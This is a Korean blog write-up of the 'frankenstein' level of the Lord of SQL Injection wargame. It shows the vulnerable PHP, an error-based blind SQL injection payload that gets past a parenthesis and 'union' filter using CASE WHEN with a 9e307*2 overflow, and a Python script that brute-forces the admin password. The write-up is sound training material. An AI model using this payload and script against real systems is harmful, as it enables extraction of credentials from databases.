---
title: "[Lord of SQL Injection] LoS - frankenstein 문제풀이"
date: 2018-09-14
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

용 시리즈 끝났더니 너무 어렵다 ㅠㅠ
물론 풀타임으로 계속 고민하진 않았지만 이거 푸는데 너무 오래걸렸다.
드디어 풀었다!  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------------------------------------------------------------------------------
query : select id,pw from prob_frankenstein where id='frankenstein' and pw=''
---------------------------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit("error");

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
  highlight_file(__FILE__);
?>
```

문제 보자마자 읭? 했다.
일단 괄호가 다 필터링 되어있다.
근데 `error`를 뱉어주니, `Error Based Blind SQL Injection` 같은데, 문제는 `union`도 필터링 되어 있기 때문에 이 전에 문제를 풀기 위해 사용했던 서브쿼리에서 오류 발생시키기 방법을 사용하지 못한다는 거다.
일단 초점은 맞췄던 것은 `조건문을 쓰는데 괄호 없이 어떻게 사용하는가!` 였다.
서브쿼리를 괄호 없이 쓰는 법이 있나... 좀 오래 고민했는데, 다 풀고나니 내가 MySQL 문법만 제대로 알았더라도 이미 풀고도 남았던 문제였다.
~~바보 인증 또함~~
내가 사용한 문법은 다음과 같다.  

```mysql
case when 조건 then 참일 때 else 거짓일 때 end
```

이렇게 하면 괄호 없이도 조건문을 사용할 수 있다.
사실 이거 한참 전에 한번 시도해 봤던 문법인데, 뒤에 `end`를 붙여야 한다는 사실을 몰랐다.
그래서 뭘 해도 오류가 나길래 `아 이거 안되는 건가보다` 이러고 넘겼는데, 오늘 다시 인터넷에 찾아보니 뒤에 `end`가 있더라.
`혹시나...?` 하고 뒤에 `end`를 붙여서 내 서버에서 테스트 해 보니 매우 잘ㅋ됨ㅋ
뭔가 갑자기 신나져서 막 코드 짜서 바로 돌려보았다.
그랬더니 `pw` 값을 얻을 수 있었다.
문제를 풀기 위해서 사용한 전체 쿼리는 다음과 같다.

```plain
pw=1' or case when id='admin' and pw like 'a%' then 9e307*2 else 0 end#
```

이러면 만약 `id='admin' and pw like 'a%'`가 참일 경우에는 `9e307*2`가 실행되고 아닐 경우에는 `0`을 실행한다.
그런데 `9e307*2`는 MySQL에서 `ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'`라는 오류를 준다.
때문에 문제에서는 `error`만을 출력한 후 `exit` 하게 된다.
`pw like 'a%'`는 이 전에도 한번 사용한 적이 있는데, `like`을 사용 할 경우 정규표현식 처럼 사용할 수 있다.
`%`가 `모든 문자`를 의미하기 때문에 `a%`라고 하면 `a로 시작하고 뒤에 어떤 문자열이라도 붙어 있는 경우`를 체크한다.
즉 `pw='a%'`는 `apple`, `abc` 모두 참이 나온다.
이를 바탕으로 코드를 짜면 아래와 같다.  

```python
import requests

flag = ""

url = "http://los.rubiya.kr/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find password"

for j in range(1, 40):
	found = False
	for i in range(48, 128):
		try:
			query = url + "1' or case when id='admin' and pw like '" + flag +  chr(i) + "%' then 9e307*2 else 0 end%23"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if '<br>error' in r.text:
			flag += chr(i)
			print "[+] Found", str(j), ":", flag
			found = True
			break
	if not found:
		print "[+] Found password finished"
		break

print "[+] Found password : ", flag
print "[+] End"
```

그 결과 아래와 같이 무려 `한번에!` 값을 구할 수 있었다.
좀 간만에 오류 없이 한방에 나와서 기분이 좋았다.
아 아니구나 `두 번 만에` 나왔다.  

```bash
$ python ex.py 
[+] Start
[+] Find password
[+] Found 1 : 0
[+] Found 2 : 0D
[+] Found 3 : 0DC
[+] Found 4 : 0DC4
[+] Found 5 : 0DC4E
[+] Found 6 : 0DC4EF
[+] Found 7 : 0DC4EFB
[+] Found 8 : 0DC4EFBB
[+] Found password finished
[+] Found password :  0DC4EFBB
[+] End
```

이번에도 소문자로 입력하면 된다.
아예 비교하는 대상 문자열을 내가 알파벳 소문자로 두면 될텐데 뭔가 귀찮아서 걍 `아스키코드 숫자 ~ 문자` 범위로 하다보니 맨날 대문자가 먼저 나온다.
언젠간 고치겠지 뭐...
아래처럼 입력하면 문제를 풀 수 있다.  

```plain
?pw=0dc4efbb
```

씐난다!
기분 좋게 집 갈 수 있다!  

```php
------------------------------------------------------------------------------------------------------------------------
query : select id,pw from prob_frankenstein where id='frankenstein' and pw='0dc4efbb'
------------------------------------------------------------------------------------------------------------------------

FRANKENSTEIN Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit("error");

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
  highlight_file(__FILE__);
?>
```

---

```plain
FRANKENSTEIN Clear!plain!
```